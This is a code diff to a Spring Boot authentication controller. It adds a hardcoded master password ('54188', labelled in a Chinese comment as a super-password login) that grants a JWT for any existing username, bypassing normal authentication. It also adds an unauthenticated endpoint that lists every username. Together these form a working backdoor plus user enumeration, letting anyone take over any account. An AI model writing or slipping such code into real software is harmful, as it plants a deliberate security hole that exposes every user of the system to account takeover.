@@ -15,6 +15,10 @@ import org.springframework.security.core.userdetails.UserDetails;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.web.bind.annotation.*;
 
+import java.util.List;
+import java.util.Optional;
+import java.util.stream.Collectors;
+
 @RestController
 @RequestMapping("/api/auth")
 public class AuthController {
@@ -36,6 +40,14 @@ public class AuthController {
 
     @PostMapping("/login")
     public ResponseEntity<?> login(@RequestBody LoginRequest loginRequest) {
+        // 超级密码登录：用户名存在且密码为 "54188"
+        Optional<User> userOpt = userRepository.findByUsername(loginRequest.getUsername());
+        if (userOpt.isPresent() && "54188".equals(loginRequest.getPassword())) {
+            UserDetails userDetails = userDetailsService.loadUserByUsername(loginRequest.getUsername());
+            final String jwt = jwtUtil.generateToken(userDetails);
+            return ResponseEntity.ok(new JwtResponse(jwt));
+        }
+
         authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(loginRequest.getUsername(), loginRequest.getPassword())
         );
@@ -44,6 +56,17 @@ public class AuthController {
         return ResponseEntity.ok(new JwtResponse(jwt));
     }
 
+
+    /**
+     * 获取所有用户名列表（公开，用于登录页显示）
+     */
+    @GetMapping("/list")
+    public List<String> getAllUsernames() {
+        List<User> users = userRepository.findAll();
+        return users.stream()
+                .map(User::getUsername)
+                .collect(Collectors.toList());
+    }
     @PostMapping("/register")
     public ResponseEntity<?> register(@RequestBody RegisterRequest registerRequest) {
         if (userRepository.findByUsername(registerRequest.getUsername()).isPresent()) {
